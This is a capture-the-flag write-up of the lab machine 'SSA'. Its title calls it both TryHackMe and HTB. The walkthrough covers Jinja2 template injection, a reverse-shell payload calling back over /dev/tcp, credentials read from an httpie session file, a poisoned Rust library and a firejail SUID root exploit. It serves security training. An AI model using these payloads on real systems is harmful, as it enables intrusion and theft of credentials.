🧠 TryHackMe – SSA (HTB) Write-up – PGP Validation ➜ SSTI ➜ RCE ➜ PrivEsc to Root

To start, I added the machine to my /etc/hosts to resolve the hostname cleanly:

sudo su
echo "10.10.11.218 ssa.htb" >> /etc/hosts

Then I launched an initial scan using RustScan:

rustscan -a ssa.htb

🎯 Ports Open:

    22 (SSH)

    80 (HTTP)

    443 (HTTPS)

🌐 Recon on Web (Port 80)

The site represents a government-style telecom agency demonstrating PGP encryption. Since HTTPS is used and the cert is invalid, I disabled verification for enumeration:

feroxbuster -u http://ssa.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k

Interesting endpoints discovered:

    /about, /contact, /guide, /pgp

    /view and /admin redirect to /login?next=...

    Numerous static files including JavaScript, CSS, and images

🛡️ PGP Verification Feature (Vuln Discovery)

A PGP verification feature was exposed. I signed a message using:

    Key generation: pgpkeygen.com

    Signing: 2pih.com/pgp.html

Once submitted, the server returned a popup with parsed key details.

Knowing the backend is Flask (noted in the footer), I tested a basic SSTI payload in the message field:

{{7*7}}

✅ Output: 49 — confirmed Jinja2 SSTI vulnerability.
⚙️ Exploiting SSTI → Remote Code Execution (RCE)

Started a reverse shell listener using pwncat:

python3 -m pwncat
connect -lp 4444

Payload used:

{{config.__class__.__init__.__globals__['os'].popen('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"').read()}}

🔁 Got a shell — initially limited, but upgraded via:

/bin/bash

🔍 Enumeration → Credential Disclosure

While pivoting through the file system, found credentials in:

/home/atlas/.config/httpie/sessions/localhost_5000/admin.json

Extracted:

    username: silentobserver

    password: [REDACTED]

🧠 SSH Access to User (silentobserver)

Logged in as a real user via pwncat:

connect ssh://silentobserver:[REDACTED]@ssa.htb:22

Uploaded and ran linpeas.sh for further enumeration:

bash /tmp/linpeas.sh

🦠 Privilege Escalation via Rust Binary Poisoning

Discovered a suspicious binary (tipnet) being executed by root as atlas.

✅ Found writable Rust source file: lib.rs
Injected a Rust reverse shell in the poisoned lib, uploaded via pwncat.

Listener setup:

python3 -m pwncat
connect -lp 4444

Got a reverse shell as atlas.
🔓 Final PrivEsc – Firejail SUID Exploit

firejail was found with the SUID bit enabled — a known escalation vector.

Used exploit from:
👉 GugSaas Firejail SUID Exploit

Uploaded and ran the script:

chmod +x exploit.py
python3 exploit.py

Then in a second shell:

firejail --join=310279
su -

✅ Boom. Root shell acquired:

# root@sandworm:~#

🎯 Final Notes

This box combined web logic flaws (SSTI) with weak process execution and bad privilege separation. From web shell ➜ user ➜ source code poison ➜ root – a full chain with elegant exploitability.
